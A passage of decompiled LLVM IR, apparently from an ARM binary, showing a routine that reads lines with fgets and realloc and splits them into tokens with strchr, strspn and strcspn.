  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_15760 = load i32, i32* @r4, align 4
  %v6_15760 = load i32, i32* @r5, align 4
  %v9_15760 = load i32, i32* @r6, align 4
  %v12_15760 = load i32, i32* @r7, align 4
  %v15_15760 = load i32, i32* @r8, align 4
  %v18_15760 = load i32, i32* @sb, align 4
  %v21_15760 = load i32, i32* @sl, align 4
  %v24_15760 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_15764 = icmp eq i32* %arg1, null
  store i1 %v2_15764, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_15764, label %dec_label_pc_15a74, label %dec_label_pc_1577c

dec_label_pc_1577c:                               ; preds = %entry
  %v1_1577c = urem i32 %arg3, 256
  store i32 %v1_1577c, i32* @sb, align 4
  %v1_15780 = udiv i32 %arg3, 256
  %v3_15784 = urem i32 %v1_15780, 256
  %v3_15788 = mul nuw nsw i32 %v1_1577c, 4
  %v1_15790 = or i32 %v3_15788, 1
  %v1_1579c = and i32 %arg3, 131072
  %v1_157a0 = add nsw i32 %v1_1577c, -1
  %v1_157ac = and i32 %arg3, 262144
  store i32 %v1_157ac, i32* %r2.global-to-local, align 4
  %v1_157b0 = and i32 %arg3, 65536
  store i32 %v1_157b0, i32* %r3.global-to-local, align 4
  store i32 %v1_157b0, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_157c0 = add i32 %arg4, 1
  store i32 %v1_157c0, i32* @sl, align 4
  %v2_15940 = inttoptr i32 %arg2 to i32*
  %v2_15950 = icmp eq i32 %v1_1579c, 0
  %v2_159a8 = icmp eq i32 %v1_157ac, 0
  br label %dec_label_pc_157c4

dec_label_pc_157c4:                               ; preds = %dec_label_pc_157c4.backedge, %dec_label_pc_1577c
  %v2_157e0 = phi i32 [ %v0_157c4.pre, %dec_label_pc_157c4.backedge ], [ %tmp, %dec_label_pc_1577c ]
  %v1_157c4 = add i32 %v2_157e0, 4
  %v2_157c4 = inttoptr i32 %v1_157c4 to i32*
  %v3_157c4 = load i32, i32* %v2_157c4, align 4
  store i32 %v3_157c4, i32* %r3.global-to-local, align 4
  %v2_157c8 = icmp eq i32 %v3_157c4, 0
  store i1 %v2_157c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_157c8, label %dec_label_pc_157d0, label %dec_label_pc_15818

dec_label_pc_157d0:                               ; preds = %dec_label_pc_157c4
  %v1_157d0 = add i32 %v2_157e0, 16
  %v2_157d0 = inttoptr i32 %v1_157d0 to i32*
  %v3_157d0 = load i32, i32* %v2_157d0, align 4
  store i32 %v3_157d0, i32* %r3.global-to-local, align 4
  %v2_157d4 = icmp eq i32 %v3_157d0, 0
  store i1 %v2_157d4, i1* %cpsr_z.global-to-local, align 1
  %v1_157d8 = add i32 %v2_157e0, 8
  %v2_157d8 = inttoptr i32 %v1_157d8 to i32*
  %v3_157d8 = load i32, i32* %v2_157d8, align 4
  store i32 %v3_157d8, i32* %r3.global-to-local, align 4
  br i1 %v2_157d4, label %bb, label %bb66

bb:                                               ; preds = %dec_label_pc_157d0
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_157d0, align 4
  %v0_157e4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_157d0, %bb
  %v0_157e4 = phi i32 [ %v0_157e4.pre, %bb ], [ %v3_157d8, %dec_label_pc_157d0 ]
  %v2_157e4 = icmp eq i32 %v0_157e4, 0
  store i1 %v2_157e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_157e4, label %bb67, label %.thread

bb67:                                             ; preds = %bb66
  store i32 %v1_15790, i32* %r3.global-to-local, align 4
  %v2_157ec = load i32, i32* @r5, align 4
  %v3_157ec = add i32 %v2_157ec, 8
  %v4_157ec = inttoptr i32 %v3_157ec to i32*
  store i32 %v1_15790, i32* %v4_157ec, align 4
  br label %.thread

.thread:                                          ; preds = %bb66, %bb67
  %v0_157f0 = load i32, i32* @r5, align 4
  %v1_157f0 = add i32 %v0_157f0, 16
  %v2_157f0 = inttoptr i32 %v1_157f0 to i32*
  %v3_157f0 = load i32, i32* %v2_157f0, align 4
  store i32 %v3_157f0, i32* %r0.global-to-local, align 4
  %v1_157f4 = add i32 %v0_157f0, 8
  %v2_157f4 = inttoptr i32 %v1_157f4 to i32*
  %v3_157f4 = load i32, i32* %v2_157f4, align 4
  store i32 %v3_157f4, i32* %r3.global-to-local, align 4
  %v2_157f8 = add i32 %v3_157f4, %v3_157f0
  store i32 %v2_157f8, i32* %r0.global-to-local, align 4
  %v1_157fc = call i32 @malloc(i32 %v2_157f8)
  store i32 %v1_157fc, i32* %r0.global-to-local, align 4
  %v2_15800 = icmp eq i32 %v1_157fc, 0
  store i1 %v2_15800, i1* %cpsr_z.global-to-local, align 1
  %v1_15804 = load i32, i32* @r5, align 4
  %v2_15804 = add i32 %v1_15804, 4
  %v3_15804 = inttoptr i32 %v2_15804 to i32*
  store i32 %v1_157fc, i32* %v3_15804, align 4
  br i1 %v2_15800, label %dec_label_pc_15a74, label %dec_label_pc_1580c

dec_label_pc_1580c:                               ; preds = %.thread
  %v0_1580c = load i32, i32* @r5, align 4
  %v1_1580c = add i32 %v0_1580c, 20
  %v2_1580c = inttoptr i32 %v1_1580c to i32*
  %v3_1580c = load i32, i32* %v2_1580c, align 4
  %v1_15810 = or i32 %v3_1580c, 1
  store i32 %v1_15810, i32* %r3.global-to-local, align 4
  store i32 %v1_15810, i32* %v2_1580c, align 4
  %v0_15818.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15818

dec_label_pc_15818:                               ; preds = %dec_label_pc_157c4, %dec_label_pc_1580c
  %v1_15820 = phi i32 [ %v2_157e0, %dec_label_pc_157c4 ], [ %v0_15818.pre, %dec_label_pc_1580c ]
  %v1_15818 = add i32 %v1_15820, 4
  %v2_15818 = inttoptr i32 %v1_15818 to i32*
  %v3_15818 = load i32, i32* %v2_15818, align 4
  store i32 %v3_15818, i32* %r2.global-to-local, align 4
  %v4_15818 = add i32 %v1_15820, 8
  %v5_15818 = inttoptr i32 %v4_15818 to i32*
  %v6_15818 = load i32, i32* %v5_15818, align 4
  %v2_1581c = add i32 %v6_15818, %v3_15818
  store i32 %v2_1581c, i32* %r3.global-to-local, align 4
  %v2_15820 = add i32 %v1_15820, 12
  %v3_15820 = inttoptr i32 %v2_15820 to i32*
  store i32 %v2_1581c, i32* %v3_15820, align 4
  %v0_15824 = load i32, i32* @fp, align 4
  store i32 %v0_15824, i32* @r6, align 4
  br label %dec_label_pc_15828

dec_label_pc_15828:                               ; preds = %dec_label_pc_158b4, %dec_label_pc_158a0, %dec_label_pc_15818
  %v0_15830 = phi i32 [ %v0_15824, %dec_label_pc_15818 ], [ %v1_158a0, %dec_label_pc_158a0 ], [ %v0_15830.pre.pre, %dec_label_pc_158b4 ]
  %v0_15828 = load i32, i32* @r5, align 4
  %v1_15828 = add i32 %v0_15828, 12
  store i32 %v1_15828, i32* %r0.global-to-local, align 4
  %v1_1582c = inttoptr i32 %v1_15828 to i32*
  %v2_1582c = load i32, i32* %v1_1582c, align 4
  store i32 %v2_1582c, i32* %r0.global-to-local, align 4
  %v3_1582c = add i32 %v0_15828, 16
  %v4_1582c = inttoptr i32 %v3_1582c to i32*
  %v5_1582c = load i32, i32* %v4_1582c, align 4
  %v2_15830 = add i32 %v2_1582c, %v0_15830
  store i32 %v2_15830, i32* %r0.global-to-local, align 4
  %v2_15834 = sub i32 %v5_1582c, %v0_15830
  %v1_15838 = inttoptr i32 %v0_15828 to i32*
  %v2_15838 = load i32, i32* %v1_15838, align 4
  store i32 %v2_15838, i32* %r2.global-to-local, align 4
  %v3_1583c = call i32 @fgets(i32 %v2_15830, i32 %v2_15834, i32 %v2_15838)
  store i32 %v3_1583c, i32* %r0.global-to-local, align 4
  store i32 %v3_1583c, i32* %r4.global-to-local, align 4
  %v2_15840 = icmp eq i32 %v3_1583c, 0
  store i1 %v2_15840, i1* %cpsr_z.global-to-local, align 1
  %v0_15848 = load i32, i32* @r5, align 4
  %v1_15848 = add i32 %v0_15848, 12
  br i1 %v2_15840, label %dec_label_pc_15848, label %dec_label_pc_15860

dec_label_pc_15848:                               ; preds = %dec_label_pc_15828
  store i32 %v1_15848, i32* %r0.global-to-local, align 4
  %v1_1584c = inttoptr i32 %v1_15848 to i32*
  %v2_1584c = load i32, i32* %v1_1584c, align 4
  store i32 %v2_1584c, i32* %r0.global-to-local, align 4
  %v3_1584c = add i32 %v0_15848, 16
  %v4_1584c = inttoptr i32 %v3_1584c to i32*
  %v5_1584c = load i32, i32* %v4_1584c, align 4
  store i32 %v5_1584c, i32* @r2, align 4
  %v2_15854 = inttoptr i32 %v2_1584c to i8*
  %v3_15854 = call i32 @__GI_memset(i8* %v2_15854, i32 0)
  store i32 %v3_15854, i32* %r0.global-to-local, align 4
  %v0_15858 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15a78

dec_label_pc_15860:                               ; preds = %dec_label_pc_15828
  %v2_15860 = inttoptr i32 %v1_15848 to i32*
  %v3_15860 = load i32, i32* %v2_15860, align 4
  store i32 %v3_15860, i32* @r4, align 4
  %v1_15864 = load i32, i32* @r6, align 4
  %v2_15864 = add i32 %v1_15864, %v3_15860
  %v3_15864 = inttoptr i32 %v2_15864 to i8*
  store i32 %v2_15864, i32* %r0.global-to-local, align 4
  %v3_15868 = call i32 @strlen(i8* %v3_15864)
  %v0_15870 = load i32, i32* @r6, align 4
  %v2_15870 = add i32 %v0_15870, %v3_15868
  store i32 %v2_15870, i32* @r6, align 4
  %v0_15874 = load i32, i32* @r4, align 4
  store i32 %v0_15874, i32* @r0, align 4
  %v2_15878 = call i32 @__GI_strchr(i32 %v0_15874, i32 10)
  store i32 %v2_15878, i32* %r0.global-to-local, align 4
  %v2_1587c = icmp eq i32 %v2_15878, 0
  store i1 %v2_1587c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1587c, label %dec_label_pc_158a8, label %dec_label_pc_15884

dec_label_pc_15884:                               ; preds = %dec_label_pc_15860
  %v1_15884 = inttoptr i32 %v2_15878 to i8*
  %v2_15884 = load i8, i8* %v1_15884, align 1
  %v3_15884 = zext i8 %v2_15884 to i32
  %v1_15888 = add nuw nsw i32 %v3_15884, 255
  %v1_1588c = urem i32 %v1_15888, 256
  store i32 %v1_1588c, i32* %r3.global-to-local, align 4
  %v7_15890 = icmp eq i32 %v1_1588c, 92
  store i1 %v7_15890, i1* %cpsr_z.global-to-local, align 1
  %v1_15894 = trunc i32 %v1_15888 to i8
  store i8 %v1_15894, i8* %v1_15884, align 1
  %v0_15898 = load i32, i32* @r6, align 4
  %v1_15898 = add i32 %v0_15898, -1
  store i32 %v1_15898, i32* @r6, align 4
  %v0_1589c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1589c, label %dec_label_pc_158a0, label %dec_label_pc_1592c

dec_label_pc_158a0:                               ; preds = %dec_label_pc_15884
  %v1_158a0 = add i32 %v0_15898, -2
  store i32 %v1_158a0, i32* @r6, align 4
  br label %dec_label_pc_15828

dec_label_pc_158a8:                               ; preds = %dec_label_pc_15860
  %v0_158a8 = load i32, i32* @r5, align 4
  %v1_158a8 = add i32 %v0_158a8, 20
  %v2_158a8 = inttoptr i32 %v1_158a8 to i32*
  %v3_158a8 = load i32, i32* %v2_158a8, align 4
  store i32 %v3_158a8, i32* %r3.global-to-local, align 4
  %v2_158ac = icmp eq i32 %v3_158a8, 0
  store i1 %v2_158ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_158ac, label %dec_label_pc_158e4, label %dec_label_pc_158b4

dec_label_pc_158b4:                               ; preds = %dec_label_pc_158a8
  %v1_158b4 = add i32 %v0_158a8, 16
  %v2_158b4 = inttoptr i32 %v1_158b4 to i32*
  %v3_158b4 = load i32, i32* %v2_158b4, align 4
  store i32 %v3_158b4, i32* %r3.global-to-local, align 4
  %v1_158b8 = add i32 %v0_158a8, 8
  %v2_158b8 = inttoptr i32 %v1_158b8 to i32*
  %v3_158b8 = load i32, i32* %v2_158b8, align 4
  %v1_158bc = add i32 %v3_158b4, 4096
  store i32 %v1_158bc, i32* %r3.global-to-local, align 4
  %v2_158c0 = add i32 %v3_158b8, %v1_158bc
  store i32 %v1_158bc, i32* %v2_158b4, align 4
  %v0_158c8 = load i32, i32* @r5, align 4
  %v1_158c8 = add i32 %v0_158c8, 4
  %v2_158c8 = inttoptr i32 %v1_158c8 to i32*
  %v3_158c8 = load i32, i32* %v2_158c8, align 4
  store i32 %v3_158c8, i32* %r0.global-to-local, align 4
  %v2_158cc = inttoptr i32 %v3_158c8 to i32*
  %v3_158cc = call i32 @realloc(i32* %v2_158cc, i32 %v2_158c0)
  store i32 %v3_158cc, i32* %r0.global-to-local, align 4
  %v0_158d0 = load i32, i32* @r5, align 4
  %v1_158d0 = add i32 %v0_158d0, 8
  %v2_158d0 = inttoptr i32 %v1_158d0 to i32*
  %v3_158d0 = load i32, i32* %v2_158d0, align 4
  %v2_158d4 = add i32 %v3_158d0, %v3_158cc
  store i32 %v2_158d4, i32* %r3.global-to-local, align 4
  %v2_158d8 = add i32 %v0_158d0, 12
  %v3_158d8 = inttoptr i32 %v2_158d8 to i32*
  store i32 %v2_158d4, i32* %v3_158d8, align 4
  %v1_158dc = load i32, i32* @r5, align 4
  %v2_158dc = add i32 %v1_158dc, 4
  %v3_158dc = inttoptr i32 %v2_158dc to i32*
  store i32 %v3_158cc, i32* %v3_158dc, align 4
  %v0_15830.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15828

dec_label_pc_158e4:                               ; preds = %dec_label_pc_158a8, %.dec_label_pc_158e4_crit_edge
  %v0_158e4 = phi i32 [ %v0_158e4.pre, %.dec_label_pc_158e4_crit_edge ], [ %v0_158a8, %dec_label_pc_158a8 ]
  %v1_158e4 = inttoptr i32 %v0_158e4 to i32*
  %v2_158e4 = load i32, i32* %v1_158e4, align 4
  %v1_158e8 = add i32 %v2_158e4, 52
  %v2_158e8 = inttoptr i32 %v1_158e8 to i32*
  %v3_158e8 = load i32, i32* %v2_158e8, align 4
  store i32 %v3_158e8, i32* %r3.global-to-local, align 4
  %v2_158ec = icmp eq i32 %v3_158e8, 0
  store i1 %v2_158ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_158ec, label %dec_label_pc_15918, label %dec_label_pc_158f4

dec_label_pc_158f4:                               ; preds = %dec_label_pc_158e4
  %v1_158f4 = add i32 %v2_158e4, 16
  %v2_158f4 = inttoptr i32 %v1_158f4 to i32*
  %v3_158f4 = load i32, i32* %v2_158f4, align 4
  store i32 %v3_158f4, i32* %r2.global-to-local, align 4
  %v1_158f8 = add i32 %v2_158e4, 24
  %v2_158f8 = inttoptr i32 %v1_158f8 to i32*
  %v3_158f8 = load i32, i32* %v2_158f8, align 4
  store i32 %v3_158f8, i32* %r3.global-to-local, align 4
  %v3_158fc = icmp ult i32 %v3_158f4, %v3_158f8
  %v9_158fc = icmp eq i32 %v3_158f4, %v3_158f8
  store i1 %v9_158fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_158fc, label %dec_label_pc_15920thread-pre-split, label %dec_label_pc_1590c

dec_label_pc_1590c:                               ; preds = %dec_label_pc_158f4
  store i32 %v2_158e4, i32* %r0.global-to-local, align 4
  %v1_15910 = inttoptr i32 %v2_158e4 to i16*
  %v2_15910 = call i32 @getc_unlocked(i16* %v1_15910)
  store i32 %v2_15910, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15920

dec_label_pc_15918:                               ; preds = %dec_label_pc_158e4
  store i32 %v2_158e4, i32* %r0.global-to-local, align 4
  %v1_1591c = call i32 @__GI_fgetc(i32 %v2_158e4)
  store i32 %v1_1591c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15920

dec_label_pc_15920thread-pre-split:               ; preds = %dec_label_pc_158f4
  %v2_15900 = inttoptr i32 %v3_158f4 to i8*
  %v3_15900 = load i8, i8* %v2_15900, align 1
  %v4_15900 = zext i8 %v3_15900 to i32
  store i32 %v4_15900, i32* %r0.global-to-local, align 4
  %v6_15900 = add i32 %v3_158f4, 1
  store i32 %v6_15900, i32* %r2.global-to-local, align 4
  store i32 %v6_15900, i32* %v2_158f4, align 4
  %v0_15920.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15920

dec_label_pc_15920:                               ; preds = %dec_label_pc_15920thread-pre-split, %dec_label_pc_1590c, %dec_label_pc_15918
  %v1_15924 = phi i32 [ %v0_15920.pr, %dec_label_pc_15920thread-pre-split ], [ %v2_15910, %dec_label_pc_1590c ], [ %v1_1591c, %dec_label_pc_15918 ]
  %v7_15920 = icmp eq i32 %v1_15924, 10
  store i1 %v7_15920, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15920, label %dec_label_pc_1592c.loopexit, label %bb68

bb68:                                             ; preds = %dec_label_pc_15920
  %v8_15924 = icmp eq i32 %v1_15924, -1
  store i1 %v8_15924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_15924, label %dec_label_pc_1592c.loopexit, label %.dec_label_pc_158e4_crit_edge

.dec_label_pc_158e4_crit_edge:                    ; preds = %bb68
  %v0_158e4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_158e4

dec_label_pc_1592c.loopexit:                      ; preds = %bb68, %dec_label_pc_15920
  %v0_1592c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1592c

dec_label_pc_1592c:                               ; preds = %dec_label_pc_15884, %dec_label_pc_1592c.loopexit
  %v0_1592c = phi i32 [ %v0_1592c.pre, %dec_label_pc_1592c.loopexit ], [ %v1_15898, %dec_label_pc_15884 ]
  %v7_1592c = icmp eq i32 %v0_1592c, -1
  store i1 %v7_1592c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1592c, label %dec_label_pc_15a74, label %dec_label_pc_15934

dec_label_pc_15934:                               ; preds = %dec_label_pc_1592c
  %v0_15934 = load i32, i32* @r5, align 4
  %v1_15934 = add i32 %v0_15934, 4
  %v2_15934 = inttoptr i32 %v1_15934 to i32*
  %v3_15934 = load i32, i32* %v2_15934, align 4
  store i32 %v3_15934, i32* %r0.global-to-local, align 4
  store i32 %v3_15788, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %v3_15934, i32* %v2_15940, align 4
  %v0_15944 = load i32, i32* @fp, align 4
  %v2_15948 = inttoptr i32 %v3_15934 to i8*
  %v3_15948 = call i32 @__GI_memset(i8* %v2_15948, i32 %v0_15944)
  store i32 %v3_15948, i32* %r0.global-to-local, align 4
  store i32 %v1_1579c, i32* %r2.global-to-local, align 4
  store i1 %v2_15950, i1* %cpsr_z.global-to-local, align 1
  %v0_15954 = load i32, i32* @r5, align 4
  %v1_15954 = add i32 %v0_15954, 12
  %v2_15954 = inttoptr i32 %v1_15954 to i32*
  %v3_15954 = load i32, i32* %v2_15954, align 4
  store i32 %v3_15954, i32* @r4, align 4
  br i1 %v2_15950, label %dec_label_pc_1596c, label %dec_label_pc_1595c

dec_label_pc_1595c:                               ; preds = %dec_label_pc_15934
  store i32 %v3_15954, i32* @r0, align 4
  %v1_15964 = inttoptr i32 %v3_15954 to i8*
  %v2_15964 = call i32 @__GI_strspn(i8* %v1_15964)
  store i32 %v2_15964, i32* %r0.global-to-local, align 4
  %v0_15968 = load i32, i32* @r4, align 4
  %v2_15968 = add i32 %v0_15968, %v2_15964
  store i32 %v2_15968, i32* @r4, align 4
  br label %dec_label_pc_1596c

dec_label_pc_1596c:                               ; preds = %dec_label_pc_15934, %dec_label_pc_1595c
  %v0_15a4413 = phi i32 [ %v3_15954, %dec_label_pc_15934 ], [ %v2_15968, %dec_label_pc_1595c ]
  %v1_1596c = inttoptr i32 %v0_15a4413 to i8*
  %v2_1596c = load i8, i8* %v1_1596c, align 1
  %v3_1596c = zext i8 %v2_1596c to i32
  store i32 %v3_1596c, i32* %r2.global-to-local, align 4
  %v2_15970 = icmp eq i8 %v2_1596c, 0
  store i1 %v2_15970, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15970, label %dec_label_pc_157c4.backedge, label %dec_label_pc_15978

dec_label_pc_157c4.backedge:                      ; preds = %dec_label_pc_1596c, %dec_label_pc_15a6c, %dec_label_pc_15978
  %v0_157c4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_157c4

dec_label_pc_15978:                               ; preds = %dec_label_pc_1596c
  %v0_15978 = load i32, i32* @r7, align 4
  %v1_15978 = inttoptr i32 %v0_15978 to i8*
  %v2_15978 = load i8, i8* %v1_15978, align 1
  %v3_15978 = zext i8 %v2_15978 to i32
  store i32 %v3_15978, i32* %r3.global-to-local, align 4
  %v9_1597c = icmp eq i8 %v2_15978, %v2_1596c
  store i1 %v9_1597c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1597c, label %dec_label_pc_157c4.backedge, label %dec_label_pc_15a44.preheader

dec_label_pc_15a44.preheader:                     ; preds = %dec_label_pc_15978
  %v1_15980 = load i32, i32* @fp, align 4
  store i32 %v1_15980, i32* @r6, align 4
  %v2_15a4415 = load i8, i8* %v1_1596c, align 1
  %v3_15a4416 = zext i8 %v2_15a4415 to i32
  store i32 %v3_15a4416, i32* %r2.global-to-local, align 4
  %v2_15a4817 = icmp eq i8 %v2_15a4415, 0
  store i1 %v2_15a4817, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15a4817, label %dec_label_pc_15a60, label %dec_label_pc_15a50.preheader

dec_label_pc_15a50.preheader:                     ; preds = %dec_label_pc_15a44.preheader
  %v2_15a5082 = load i8, i8* %v1_15978, align 1
  %v3_15a5083 = zext i8 %v2_15a5082 to i32
  store i32 %v3_15a5083, i32* %r3.global-to-local, align 4
  %v9_15a5486 = icmp eq i8 %v2_15a5082, %v2_15a4415
  store i1 %v9_15a5486, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15a5486, label %dec_label_pc_15a60, label %bb74

dec_label_pc_1598c:                               ; preds = %bb74
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_15990 = load i32, i32* %v2_15940, align 4
  store i32 %v2_15990, i32* %r3.global-to-local, align 4
  store i32 %v1_157a0, i32* %r2.global-to-local, align 4
  %v9_15998 = icmp eq i32 %v2_1599c88, %v1_157a0
  store i1 %v9_15998, i1* %cpsr_z.global-to-local, align 1
  %v5_1599c = mul i32 %v2_1599c88, 4
  %v6_1599c = add i32 %v2_15990, %v5_1599c
  %v7_1599c = inttoptr i32 %v6_1599c to i32*
  store i32 %v0_1599c87, i32* %v7_1599c, align 4
  br i1 %v9_15998, label %dec_label_pc_159a4, label %dec_label_pc_159b0

dec_label_pc_159a4:                               ; preds = %dec_label_pc_1598c
  store i32 %v1_157ac, i32* %r3.global-to-local, align 4
  store i1 %v2_159a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_159a8, label %dec_label_pc_159b0, label %dec_label_pc_159d0

dec_label_pc_159b0:                               ; preds = %dec_label_pc_159a4, %dec_label_pc_1598c
  %v0_159b0 = load i32, i32* @r7, align 4
  %v1_159b0 = inttoptr i32 %v0_159b0 to i8*
  %v2_159b0 = load i8, i8* %v1_159b0, align 1
  %v3_159b0 = zext i8 %v2_159b0 to i32
  store i32 %v3_159b0, i32* %r3.global-to-local, align 4
  %v2_159b4 = icmp eq i8 %v2_159b0, 0
  store i1 %v2_159b4, i1* %cpsr_z.global-to-local, align 1
  %v0_159b8 = load i32, i32* @r4, align 4
  store i32 %v0_159b8, i32* @r0, align 4
  %v1_159bc = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_159b4, i32 %v1_159bc, i32 %v0_159b0
  store i32 %storemerge, i32* @r1, align 4
  %v0_159c4 = call i32 @strcspn()
  store i32 %v0_159c4, i32* %r0.global-to-local, align 4
  %v0_159c8 = load i32, i32* @r4, align 4
  %v2_159c8 = add i32 %v0_159c8, %v0_159c4
  store i32 %v2_159c8, i32* @r4, align 4
  br label %dec_label_pc_15a08

dec_label_pc_159d0:                               ; preds = %dec_label_pc_159a4
  %v0_159d0 = load i32, i32* @r4, align 4
  store i32 %v0_159d0, i32* @r0, align 4
  %v0_159d4 = load i32, i32* @r7, align 4
  %v1_159d4 = inttoptr i32 %v0_159d4 to i8*
  %v2_159d4 = load i8, i8* %v1_159d4, align 1
  %v3_159d4 = zext i8 %v2_159d4 to i32
  %v5_159d8 = call i32 @__GI_strchrnul(i32 %v0_159d0, i32 %v3_159d4, i32 %v1_157a0, i32 %v1_157ac)
  store i32 %v5_159d8, i32* %r0.global-to-local, align 4
  store i32 %v1_1579c, i32* %r2.global-to-local, align 4
  store i1 %v2_15950, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_159d8, i32* @r4, align 4
  br i1 %v2_15950, label %dec_label_pc_15a08, label %dec_label_pc_159f4

dec_label_pc_159f0:                               ; preds = %dec_label_pc_159f4
  %v1_159f0 = add i32 %v0_15a08.pre, -1
  store i32 %v1_159f0, i32* @r4, align 4
  br label %dec_label_pc_159f4

dec_label_pc_159f4:                               ; preds = %dec_label_pc_159d0, %dec_label_pc_159f0
  %v0_159f4 = phi i32 [ %v1_159f0, %dec_label_pc_159f0 ], [ %v5_159d8, %dec_label_pc_159d0 ]
  %v1_159f4 = add i32 %v0_159f4, -1
  %v2_159f4 = inttoptr i32 %v1_159f4 to i8*
  %v3_159f4 = load i8, i8* %v2_159f4, align 1
  %v4_159f4 = zext i8 %v3_159f4 to i32
  %v0_159f8 = load i32, i32* @sl, align 4
  store i32 %v0_159f8, i32* @r0, align 4
  %v2_159fc = call i32 @__GI_strchr(i32 %v0_159f8, i32 %v4_159f4)
  store i32 %v2_159fc, i32* %r0.global-to-local, align 4
  %v2_15a00 = icmp eq i32 %v2_159fc, 0
  store i1 %v2_15a00, i1* %cpsr_z.global-to-local, align 1
  %v0_15a08.pre = load i32, i32* @r4, align 4
  br i1 %v2_15a00, label %dec_label_pc_15a08, label %dec_label_pc_159f0

dec_label_pc_15a08:                               ; preds = %dec_label_pc_159f4, %dec_label_pc_159d0, %dec_label_pc_159b0
  %v3_15a14 = phi i32 [ %v5_159d8, %dec_label_pc_159d0 ], [ %v2_159c8, %dec_label_pc_159b0 ], [ %v0_15a08.pre, %dec_label_pc_159f4 ]
  %v1_15a08 = inttoptr i32 %v3_15a14 to i8*
  %v2_15a08 = load i8, i8* %v1_15a08, align 1
  %v3_15a08 = zext i8 %v2_15a08 to i32
  store i32 %v3_15a08, i32* %r2.global-to-local, align 4
  %v0_15a0c = load i32, i32* @r7, align 4
  %v1_15a0c = inttoptr i32 %v0_15a0c to i8*
  %v2_15a0c = load i8, i8* %v1_15a0c, align 1
  %v3_15a0c = zext i8 %v2_15a0c to i32
  store i32 %v3_15a0c, i32* %r3.global-to-local, align 4
  %v9_15a10 = icmp eq i8 %v2_15a0c, %v2_15a08
  store i1 %v9_15a10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15a10, label %bb71, label %dec_label_pc_15a1c

bb71:                                             ; preds = %dec_label_pc_15a08
  %v1_15a14 = load i32, i32* @fp, align 4
  %v2_15a14 = trunc i32 %v1_15a14 to i8
  store i8 %v2_15a14, i8* %v1_15a08, align 1
  %v0_15a18.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15a18.pr, label %bb73, label %.dec_label_pc_15a1c_crit_edge

.dec_label_pc_15a1c_crit_edge:                    ; preds = %bb71
  %v0_15a1c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15a1c

dec_label_pc_15a1c:                               ; preds = %.dec_label_pc_15a1c_crit_edge, %dec_label_pc_15a08
  %v0_15a1c = phi i32 [ %v0_15a1c.pre, %.dec_label_pc_15a1c_crit_edge ], [ %v3_15a08, %dec_label_pc_15a08 ]
  %v2_15a1c = icmp eq i32 %v0_15a1c, 0
  store i1 %v2_15a1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15a1c, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_15a1c
  %v1_15a20 = load i32, i32* @fp, align 4
  %v2_15a20 = trunc i32 %v1_15a20 to i8
  %v3_15a20 = load i32, i32* @r4, align 4
  %v4_15a20 = inttoptr i32 %v3_15a20 to i8*
  store i8 %v2_15a20, i8* %v4_15a20, align 1
  %v5_15a20 = load i32, i32* @r4, align 4
  %v6_15a20 = add i32 %v5_15a20, 1
  store i32 %v6_15a20, i32* @r4, align 4
  br label %bb73

bb73:                                             ; preds = %bb71, %dec_label_pc_15a1c, %bb72
  %v2_15a24 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_15a24, i32* %r3.global-to-local, align 4
  %v2_15a28 = icmp eq i32 %v2_15a24, 0
  store i1 %v2_15a28, i1* %cpsr_z.global-to-local, align 1
  %v0_15a44.pre = load i32, i32* @r4, align 4
  br i1 %v2_15a28, label %dec_label_pc_15a40, label %dec_label_pc_15a30

dec_label_pc_15a30:                               ; preds = %bb73
  store i32 %v0_15a44.pre, i32* @r0, align 4
  %v1_15a38 = inttoptr i32 %v0_15a44.pre to i8*
  %v2_15a38 = call i32 @__GI_strspn(i8* %v1_15a38)
  store i32 %v2_15a38, i32* %r0.global-to-local, align 4
